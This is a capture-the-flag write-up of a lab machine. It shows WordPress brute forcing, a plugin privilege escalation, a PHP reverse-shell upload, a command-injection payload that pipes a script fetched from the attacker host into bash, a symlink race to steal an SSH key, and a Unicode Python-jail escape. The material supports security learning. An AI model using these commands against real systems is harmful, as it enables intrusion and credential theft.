# Breakme

### Break the system

Initial nmap scan only shows port 22 and 80 open. The webserver seems just an empty apache webserver, however, a gobuster directory enumeration shows other resources:<br />
![image](https://github.com/user-attachments/assets/1862c187-c3be-4bfc-91f8-f10a88751816)<br />
Movin around on the webserver, I found a login page at `/wordpress/wp-login`. If I try to login with `admin`, I get back a response that the password for that user is wrong. This means that the `admin` user actually exists:<br  />
![image](https://github.com/user-attachments/assets/e8d5dad4-61b2-4bba-ab34-094940f871d0)<br/>
I tried bruteforcing admin account with `wpscan --url http://10.10.75.11/wordpress/wp-login.php -U admin -P /usr/share/wordlists/rockyou.txt`, but it didn't work.
Next, the following command ` wpscan --url http://10.10.75.11/wordpress/ -e u,p,t` enumerates users, plugins and templates. This time wpscan found another user, bob: <br />
![image](https://github.com/user-attachments/assets/f0e43a3a-36df-478b-909e-cc0009e989f0)<br />
So now try bruteforce bob: `wpscan --url http://10.10.122.80/wordpress/wp-login.php -U bob -P /usr/share/wordlists/rockyou.txt`. <br />
![image](https://github.com/user-attachments/assets/1e20d13e-626c-495e-a5e1-dbe040bd3060)<br />
His credentials are `bob:soccer`. 
The previous wpscan showed that the website is using an older version of `WP data access`, which is 5.3.8. Searching online, I found [here](https://www.wordfence.com/blog/2023/04/privilege-escalation-vulnerability-patched-promptly-in-wp-data-access-wordpress-plugin/) that this version is vulnerable to privilege escalation from subscriber+ to administrator. There's no explicit POC, but the exploit works as follows: 
1) On bob's account, click on `Update Profile`, and intercept the request with Burp Suite
2) Add a parameter to the request: `wpda_role[]=administrator`
3) Forward the request and become admin!
![image](https://github.com/user-attachments/assets/7f6f9ea6-e2b3-447e-8ae7-4b05392e9664)<br />
Now, to upload a reverse shell, we need to upload it in the theme's code, which is found inside `Tools->Themes File Editor`, upload the php reverse shell(I used the [PentestMonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) one), open a netcat listener on the attackers machine and update the theme: <br />
![image](https://github.com/user-attachments/assets/e2598068-7ab7-4573-a0cb-ae4e2905ead2)<br />
Next, I [stabilized the shell](https://maxat-akbanov.com/how-to-stabilize-a-simple-reverse-shell-to-a-fully-interactive-terminal) so that i could maintain my mental integrity.<br />
Running linpaeas, it founds a set of credentials inside wordpress configuration file:<br />
![image](https://github.com/user-attachments/assets/f8e6b88d-9549-4d6b-bf3f-bd73830d8f1f)
So use the given credentials to log into the database `mysql -u econor -p`. In the database there are a couple of hashed passwords: <br />
![image](https://github.com/user-attachments/assets/a7d76b78-4539-4024-a637-343439d24388)<br />
We already know bob's password, let's try to crack the admin's password. The hash starts with `$P$`, this means that it is a `Phpass` hash format. I doesn't work, there must be something else. <br />
Linpeas also shows a local service at 127.0.0.1:9999. With `curl` I was able to see that it's a web service. In order to access the web page from the attacker's machine, we need to perform something called `port forwarding`:
1) In the target machine: run `socat TCP-LISTEN:8888,fork TCP:127.0.0.1:9999`
2) In the attacker machine: run `socat TCP4-LISTEN:9998,reuseaddr,fork TCP4:target_ip:8888`
So we are opening port 9998 on the attacker machine and redirecting everything coming in that port to target IP port 8888. Similarly, from the target machine, we redirect everything coming in port 8888 to localhost port 9999, thus accessing the web service. <br />
![image](https://github.com/user-attachments/assets/8d881702-0350-444b-85ed-06f9f0affb30)<br />
The "Check Target" function performs a ping command to the specified IP address. This is very likely a command injection exploit. Here's a list of special characters:<br />
`! @ # $ % ^ & * ( ) - _ = + \ | [ ] { } ; : / ? . >`. <br />
After hours of trying payloads, I found that this `|nc${IFS}10.11.85.53${IFS}5555` worked on the "check user" section. <br />
![image](https://github.com/user-attachments/assets/ef3b720f-e148-4c22-aa4d-23731faf2308)<br />
Now, to get a reverse shell, since we can't use `-`, what we can do is create a `rev.sh` file in our attacker's machine(can be found inside this folder). Next open a netcat listener on the attacker's machine, `nc -lnvp 6666`, and inject the curl command to get the rev.sh file and pipe it into bash. The final payload is this: `|curl${IFS}10.11.85.53/rev.sh|bash` :<br />
![image](https://github.com/user-attachments/assets/5efb5384-f0ed-4d03-ad29-ed0535c63592)<br />
Again, [stabilize the shell](https://maxat-akbanov.com/how-to-stabilize-a-simple-reverse-shell-to-a-fully-interactive-terminal). <br />
I'm now the user `john` and got the first flag. Running again linpeas on the system, there's a SUID file inside `/home/youcef`, called `readfile`. It seems to be working like a `cat` command. If I use it to try to read something on which I don't have permissions, this is what i get: <br />
![image](https://github.com/user-attachments/assets/14814808-a0c9-4b14-aa1a-7a428f809db1)<br />
Also, it doesn't seem to be vulnerable to buffer overflow because I tried running it with really large inputs, but it never goes into segmentation fault. So I decided to analyze it using IDA (I first had to transfer it on my local machine using netcat).<br />
![image](https://github.com/user-attachments/assets/ef559c13-0022-4f04-8b3f-9100b48fdb74)<br />
At the beginning of the main function, there are three checks. The first checks that the program only takes one input from the command line. The second checks that the file_name is valid, and the third checks that the user running the binary is actually john, with id=1002. Next:<br />
![image](https://github.com/user-attachments/assets/63b003a1-c324-4778-bfe2-ae85fefac356)<br />
Here the program uses the function `_strstr` to check if the filename contains the word "flag" and the word "id_rsa". Then it checks if it's a symlink with the `lstat` function, and if it can be accessed with the `_access` function. If any of these conditions are true, then it jumps to the following block:<br />
![image](https://github.com/user-attachments/assets/f13e1d7a-1bf0-4676-aea8-0448e42dc7c8)<br />
And the program stops. If we pass all the checks, then the program goes here: <br />
![image](https://github.com/user-attachments/assets/c69142c8-7751-49ce-aef6-aac01a94f04a)<br />
Here it's opening the file with the function `_open`, and if the the function fails, it will call `__assert_fail` and the program will stop. <br />
Instead, if the file is opened correctly, the program goes here: <br />
![image](https://github.com/user-attachments/assets/40be8666-5de7-407f-8b3a-4d4f171e9874)<br />
Here the program is calling the `_read` function every 1024 bytes. It then sets the file descriptor to 1 (sdtoutput) and calls `_write`, so that the user can read the file. It then checks if the number of written bytes is zero: if it is, then the program stops; if it isn't, then it will read the next 1024 bytes.  <br /><br />

I was stuck here for a long time and couldn't make progress. So I decided to look at an external writeup to see the solution and try to learn something from it. The solution was **race condition**. That's a first to me. <br />
Basically the idea is that since the outcome of the binary depends, among other things, on whether the file is a symlink or not, and since the checks are sequencial, I can try to change the state of the file **between the checks and the read**. From my understanding, the steps of this attack are the following:

    step 1: create a normal file (using the `touch` command). 
    step 2: run the binary in order to read the new file
    step 3: the binary checks that all the conditions are met, including that it is not a symlink
    step 4: in the timeframe right after the checks but right before the file read, make that file a symlink to `.ssh/id_rsa`
    step 5: the binary reads `.ssh/id_rsa`

Of course I don't have the control to stop the program and change the state of the file just as I please. The attack is called **race condition** because "whoever comes first wins", meaning that I have to run a script that makes the normal file and changes it to symlink, and at the same time I have to run the `readfile` binary, hoping that the events will happen in the order listed above. <br />
Of course there's a very low chance that it will happen. That's why the idea is to run the script and the `readfile` binary at the same time and multiple times, hoping that at some point the right conditions will happen and I win the race. 
The first command I need to run is:

    while true; do ln -sf /home/youcef/.ssh/id_rsa symlink; rm symlink; touch symlink; done &
This command creates an infinite loop that creates and destroys a file and makes it into a symlink, constantly changing the state of the target file for the `readfile` binary. <br />
The next command: 

    for i in {1..30}; do /home/youcef/readfile symlink; done
tries to read from the symlink 30 times. <br />
After executing these two commands, I got a bunch of errors, but I also got the `id_rsa` file, so I won the race! Now I copy it in my attacker's machine, I change the permissions with `chmod 600 id_rsa`. Before using it, we need to crack the passphrase. To do it, run `ssh2john id_rsa > id_rsa_hash` and then run `john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash`:<br />
![image](https://github.com/user-attachments/assets/64e2672d-90b6-4c35-8869-8ac360bcd8bb)<br />
Now we can log into youcef's account with `ssh youcef@ip_addr -i id_rsa` and prompt the passphrase and get the second flag. <br />
I now need to become root. If I run `sudo -l` I get the following sudo permission: <br />
![image](https://github.com/user-attachments/assets/b4a260cd-a772-4fab-aaff-611e5a185787)<br />
This is a python jail. After searching online for a bit, I found that the solution is in using `𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵()`. <br />
A breakpoint in Python is a debugging tool introduced in Python 3.7 that allows developers to pause program execution and inspect its state interactively. The default implementation of breakpoint() launches the Python Debugger (`pdb`), and `pdb` accepts and executes Python input directly! This means that if I'm able to run the `breakpoint()` command, I could spawn a root shell or directly read the last flag. However the filter blocks the string `breakpoint()`, but it does not block `𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵()`! This string is not composed of ASCII characters. Instead, it uses Unicode characters that look visually identical to the ASCII ones but are fundamentally different.<br />
Filters in this Python Jail were likely configured to block literal ASCII strings like breakpoint, but they failed to account for visually similar Unicode variants. Since Python treats Unicode identifiers as valid names, the Jail couldn't recognize or filter the Unicode version of breakpoint:<br />
![image](https://github.com/user-attachments/assets/e4c5988f-bc18-40e9-a7b9-fbdf56976c8f)<br /><br />

This room was really hard for me and I'm not going to lie, I cheated a little. But it's been really informative.

